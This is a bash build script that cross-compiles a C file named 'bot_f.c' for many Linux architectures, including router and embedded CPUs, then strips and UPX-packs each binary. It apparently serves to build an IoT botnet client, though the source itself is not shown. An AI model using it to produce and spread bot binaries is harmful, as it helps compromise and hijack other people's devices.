#!/usr/bin/env bash
set -euo pipefail

SRC="bot_f.c"
BINS="bins"
mkdir -p "$BINS"

STRIP="strip --strip-all"
UPX="upx --best"

declare -A ARCHES
ARCHES=(
    [x86_64]=x86_64-linux-gnu
    [x86]=i686-linux-gnu
    [i686]=i686-linux-gnu
    [i586]=i586-linux-gnu
    [aarch64]=aarch64-linux-gnu
    [armv4l]=arm-linux-gnueabi
    [armv5l]=arm-linux-gnueabi
    [armv6l]=arm-linux-gnueabihf
    [armv7l]=arm-linux-gnueabihf
    [mips]=mips-linux-gnu
    [mipsel]=mipsel-linux-gnu
    [mips64]=mips64-linux-gnuabi64
    [mips64el]=mips64el-linux-gnuabi64
    [powerpc]=powerpc-linux-gnu
    [powerpc64]=powerpc64-linux-gnu
    [powerpc64le]=powerpc64le-linux-gnu
    [sh4]=sh4-linux-gnu
    [m68k]=m68k-linux-gnu
    [sparc]=sparc-linux-gnu
    [sparc64]=sparc64-linux-gnu
    [s390x]=s390x-linux-gnu
    [riscv64]=riscv64-linux-gnu
    [alpha]=alpha-linux-gnu
    [hppa]=hppa-linux-gnu
)

do_build() {
    local arch="$1"
    local prefix="${ARCHES[$arch]}"
    local cc="${prefix}-gcc"
    local out="${BINS}/${arch}-linux-gnu"

    if ! command -v "$cc" &>/dev/null; then
        echo "  [SKIP] $cc not found"
        return
    fi

    echo "  [BUILD] $arch ($prefix) [cross]"
    $cc -o "$out" "$SRC" -lpthread -lm -Os -s 2>&1 | sed 's/^/    /'

    if [ -x "$out" ]; then
        echo "    stripping..."
        $STRIP "$out" 2>/dev/null || true
        echo "    packing with upx..."
        $UPX "$out" 2>&1 | sed 's/^/    /' || true
        local size
        size=$(stat -c%s "$out" 2>/dev/null || stat -f%z "$out" 2>/dev/null || echo "?")
        echo "    done → ${out} (${size} bytes)"
    else
        echo "    FAILED"
    fi
}

echo "=== Building bot_f.c for all architectures ==="
echo ""

for arch in "${!ARCHES[@]}"; do
    do_build "$arch"
done
if command -v gcc &>/dev/null; then
    NATIVE=$(uname -m)
    OUT="${BINS}/${NATIVE}-linux-gnu"
    if [ ! -f "$OUT" ]; then
        echo "  [BUILD] $NATIVE (native gcc)"
        gcc -o "$OUT" "$SRC" -lpthread -lm -Os -s 2>&1 | sed 's/^/    /'
        if [ -x "$OUT" ]; then
            $STRIP "$OUT" 2>/dev/null || true
            $UPX "$OUT" 2>&1 | sed 's/^/    /' || true
        fi
    fi
fi

echo ""
echo "=== Results ==="
ls -lh "$BINS"/
